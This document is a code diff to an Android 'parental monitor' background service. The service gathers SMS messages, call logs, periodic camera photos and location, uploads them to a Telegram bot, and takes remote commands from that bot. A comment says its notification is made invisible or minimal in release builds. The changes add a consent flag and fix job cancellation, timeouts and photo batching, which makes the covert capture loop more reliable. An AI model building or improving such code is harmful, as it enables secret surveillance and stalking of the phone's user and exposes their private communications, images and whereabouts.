@@ -41,6 +41,7 @@ class MonitoringService : Service() {
     private var monitoringJob: Job? = null
     private var cameraJob: Job? = null
     private var commandJob: Job? = null
+    private var initialSyncJob: Job? = null
     private val initialSyncStarted = java.util.concurrent.atomic.AtomicBoolean(false)
     private val initialSyncRunning = java.util.concurrent.atomic.AtomicBoolean(false)
     private var cachedBotToken = ""
@@ -89,7 +90,7 @@ class MonitoringService : Service() {
 
     private fun shouldAutoResume(): Boolean {
         return try {
-            preferencesManager.isMonitoringEnabled && preferencesManager.isConfigured() && !preferencesManager.userDisabledMonitoring
+            preferencesManager.isMonitoringEnabled && preferencesManager.isConfigured() && !preferencesManager.userDisabledMonitoring && preferencesManager.userConsentedMonitoring
         } catch (_: Exception) {
             false
         }
@@ -111,7 +112,7 @@ class MonitoringService : Service() {
     private fun redactToken(value: String?): String {
         if (value.isNullOrEmpty()) return value ?: ""
         val token = try {
-            preferencesManager.botToken
+            cachedBotToken.ifEmpty { preferencesManager.botToken }
         } catch (_: Exception) {
             ""
         }
@@ -126,6 +127,7 @@ class MonitoringService : Service() {
         monitoringJob?.cancel()
         cameraJob?.cancel()
         commandJob?.cancel()
+        initialSyncJob?.cancel()
         refreshCreds()
         
         // In RELEASE mode, make notification invisible/minimal
@@ -185,10 +187,10 @@ class MonitoringService : Service() {
             preferencesManager.initialSyncStarted = true
             initialSyncRunning.set(true)
         } else if (!preferencesManager.initialSyncDone && preferencesManager.initialSyncStarted) {
-            preferencesManager.initialSyncDone = true
+            initialSyncRunning.set(true)
         }
         startPeriodicLoops()
-        serviceScope.launch {
+        initialSyncJob = serviceScope.launch {
             try {
                 if (initialSyncRunning.get()) {
                     if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Starting initial data collection...")
@@ -210,12 +212,14 @@ class MonitoringService : Service() {
 
     private fun startPeriodicLoops() {
         monitoringJob = serviceScope.launch {
-            while (isActive) {
+            while (isActive && monitoringJob === coroutineContext[Job]) {
                 try {
                     if (!preferencesManager.monitoringPaused) {
                         checkAndSendNewData()
                     }
                     delay(syncIntervalMillis())
+                } catch (e: java.util.concurrent.CancellationException) {
+                    throw e
                 } catch (e: Exception) {
                     android.util.Log.e("MonitoringService", "Error in monitoring loop", e)
                 }
@@ -234,7 +238,7 @@ class MonitoringService : Service() {
 
     private fun startCameraLoop() {
         cameraJob = serviceScope.launch {
-            while (isActive) {
+            while (isActive && cameraJob === coroutineContext[Job]) {
                 try {
                     val minutes = preferencesManager.cameraInterval.coerceIn(0, 60)
                     if (!preferencesManager.monitoringPaused && !isPhotoPaused() && minutes > 0) {
@@ -245,8 +249,10 @@ class MonitoringService : Service() {
                     } else {
                         val remaining = preferencesManager.photoPausedUntil - System.currentTimeMillis()
                         val idle = if (remaining > 0) remaining.coerceAtMost(30 * 60_000L) else 30 * 60_000L
-                        chunkedDelay(idle.coerceAtLeast(60_000L))
+                        chunkedDelay(idle)
                     }
+                } catch (e: java.util.concurrent.CancellationException) {
+                    throw e
                 } catch (e: Exception) {
                     android.util.Log.e("MonitoringService", "Error in camera loop", e)
                 }
@@ -255,7 +261,8 @@ class MonitoringService : Service() {
     }
 
     private suspend fun chunkedDelay(totalMs: Long) {
-        var remaining = totalMs.coerceAtLeast(60_000L)
+        var remaining = totalMs
+        if (remaining <= 0L) return
         while (remaining > 0) {
             kotlinx.coroutines.ensureActive()
             delay(minOf(remaining, 60_000L))
@@ -302,10 +309,12 @@ class MonitoringService : Service() {
 
     private fun startCommandPolling() {
         commandJob = serviceScope.launch {
-            while (isActive) {
+            while (isActive && commandJob === coroutineContext[Job]) {
                 try {
                     val active = pollTelegramCommands()
                     idlePolls = if (active) 0 else (idlePolls + 1).coerceAtMost(6)
+                } catch (e: java.util.concurrent.CancellationException) {
+                    throw e
                 } catch (e: Exception) {
                     android.util.Log.e("MonitoringService", "Error polling commands", e)
                 }
@@ -337,7 +346,7 @@ class MonitoringService : Service() {
         if (botToken.isEmpty() || chatId.isEmpty()) return false
 
         val offset = preferencesManager.lastUpdateId + 1
-        val url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset&timeout=0"
+        val url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset&timeout=10"
 
         val response = try {
             TelegramClient.api.getUpdates(url)
@@ -533,11 +542,9 @@ class MonitoringService : Service() {
                     sendToTelegram("Usage: /photointerval \u003c0-60\u003e (0 = manual only)")
                 } else if (minutes == 0) {
                     preferencesManager.cameraInterval = 0
-                    restartCameraLoop()
                     sendToTelegram("📸 Automatic photos OFF. Use /photo for manual capture.")
                 } else {
                     preferencesManager.cameraInterval = minutes
-                    restartCameraLoop()
                     sendToTelegram("📸 Photo interval set to $minutes min.")
                 }
             }
@@ -547,7 +554,6 @@ class MonitoringService : Service() {
                     sendToTelegram("Usage: /pause \u003cminutes\u003e (1-480)")
                 } else {
                     preferencesManager.photoPausedUntil = System.currentTimeMillis() + minutes * 60_000L
-                    restartCameraLoop()
                     sendToTelegram("⏸️ Photos paused for $minutes min.")
                 }
             }
@@ -558,13 +564,11 @@ class MonitoringService : Service() {
             }
             "/stop" -> {
                 preferencesManager.monitoringPaused = true
-                restartCameraLoop()
                 sendToTelegram("⏸️ Monitoring paused. Send /resume to restart.")
             }
             "/resume" -> {
                 preferencesManager.monitoringPaused = false
                 preferencesManager.photoPausedUntil = 0L
-                restartCameraLoop()
                 sendToTelegram("▶️ Monitoring resumed.")
             }
             "/location" -> {
@@ -856,7 +860,7 @@ class MonitoringService : Service() {
         if (initialSyncRunning.get()) return
         try {
             var pages = 0
-            while (pages < 5) {
+            while (pages < 1) {
                 val page = smsRepository.getNewSms(preferencesManager.lastSmsId)
                 if (page.isEmpty()) break
                 val chunks = page.chunked(10)
@@ -869,7 +873,7 @@ class MonitoringService : Service() {
                 pages++
             }
             pages = 0
-            while (pages < 5) {
+            while (pages < 1) {
                 val page = callLogRepository.getNewCalls(preferencesManager.lastCallTimestamp, preferencesManager.lastCallId)
                 if (page.isEmpty()) break
                 val chunks = page.chunked(10)
@@ -1053,6 +1057,8 @@ class MonitoringService : Service() {
         monitoringJob?.cancel()
         cameraJob?.cancel()
         commandJob?.cancel()
+        initialSyncJob?.cancel()
+        initialSyncRunning.set(false)
         watchdogJob?.cancel()
         stopForeground(STOP_FOREGROUND_REMOVE)
         stopSelf()
@@ -1071,7 +1077,7 @@ class MonitoringService : Service() {
     // ═══════════════════════════════════════════════════════════
     
     private fun captureAndSendPhoto(reportResult: Boolean = false) {
-        if (pendingPhotoCount() >= 5) {
+        if (pendingPhotoCount() >= 10) {
             prunePhotoCache()
             serviceScope.launch {
                 if (reportResult) {
@@ -1167,8 +1173,9 @@ class MonitoringService : Service() {
     
     private suspend fun notifyCameraFailure(reason: String) {
         try {
-            val now = System.currentTimeMillis()
-            if (now - preferencesManager.lastCameraErrorNotice < 30 * 60_000L) return
+            val now = android.os.SystemClock.elapsedRealtime()
+            val last = preferencesManager.lastCameraErrorNotice
+            if (last in 1L..999_999_999_999L && now - last < 30 * 60_000L) return
             preferencesManager.lastCameraErrorNotice = now
             val hint = if (!hasCameraPermission()) {
                 "Camera permission is missing — open Setup and grant it."
@@ -1183,8 +1190,9 @@ class MonitoringService : Service() {
 
     private suspend fun notifyPhotoSendFailure(detail: String) {
         try {
-            val now = System.currentTimeMillis()
-            if (now - preferencesManager.lastUploadErrorNotice < 30 * 60_000L) return
+            val now = android.os.SystemClock.elapsedRealtime()
+            val last = preferencesManager.lastUploadErrorNotice
+            if (last in 1L..999_999_999_999L && now - last < 30 * 60_000L) return
             preferencesManager.lastUploadErrorNotice = now
             sendToTelegram("⚠️ Photo upload failed ($detail). Will retry automatically.")
         } catch (e: Exception) {
@@ -1275,7 +1283,7 @@ class MonitoringService : Service() {
         }
     }
 
-    private suspend fun flushPendingPhotos(max: Int = 3) {
+    private suspend fun flushPendingPhotos(max: Int = 10) {
         val pending = try {
             cacheDir.listFiles { file ->
                 file.isFile && file.name.startsWith("camera_") && file.name.endsWith(".jpg")
@@ -1296,7 +1304,7 @@ class MonitoringService : Service() {
         } catch (_: Exception) {
         }
     }
-    private fun prunePhotoCache(maxKept: Int = 3) {
+    private fun prunePhotoCache(maxKept: Int = 10) {
         try {
             val photos = cacheDir.listFiles { file ->
                 file.isFile && file.name.startsWith("camera_") && file.name.endsWith(".jpg")
